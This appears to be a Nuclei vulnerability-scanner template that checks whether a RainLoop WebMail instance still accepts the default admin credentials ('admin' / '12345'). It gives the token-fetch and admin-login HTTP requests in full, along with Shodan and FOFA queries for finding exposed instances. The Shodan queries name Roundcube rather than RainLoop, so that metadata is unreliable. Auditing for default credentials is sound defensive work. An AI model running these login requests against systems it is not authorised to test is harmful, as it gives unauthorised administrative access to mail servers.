id: rainloop-default-login

info:
  name: Rainloop WebMail - Default Admin Login
  author: For3stCo1d
  severity: high
  description: |
    Rainloop WebMail default admin credentials were successful.
  reference:
    - https://github.com/RainLoop/rainloop-webmail/issues/28
  classification:
    cpe: cpe:2.3:a:rainloop:webmail:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: rainloop
    product: webmail
    shodan-query:
      - cpe:"cpe:2.3:a:roundcube:webmail"
      - http.component:"roundcube"
    fofa-query: app="RAINLOOP-WebMail"
    runzero-match: any(each(service["html.bodies"]), {# matches "rainloop/"})
  tags: default-login,rainloop,webmail,foss

http:
  - raw:
      - |
        GET /?/AdminAppData@no-mobile-0/0/15503332983847185/ HTTP/1.1
        Host: {{Hostname}}
      - |
        POST /?/Ajax/&q[]=/0/ HTTP/2
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        Login={{user}}&Password={{pass}}&Action=AdminLogin&XToken={{token}}

    attack: pitchfork
    payloads:
      user:
        - admin
      pass:
        - 12345

    extractors:
      - type: regex
        name: token
        internal: true
        group: 1
        regex:
          - 'token":"(.+?)"'

    matchers-condition: and
    matchers:
      - type: word
        words:
          - '"Action":"AdminLogin"'
          - '"Result":true'
        condition: and

      - type: status
        status:
          - 200

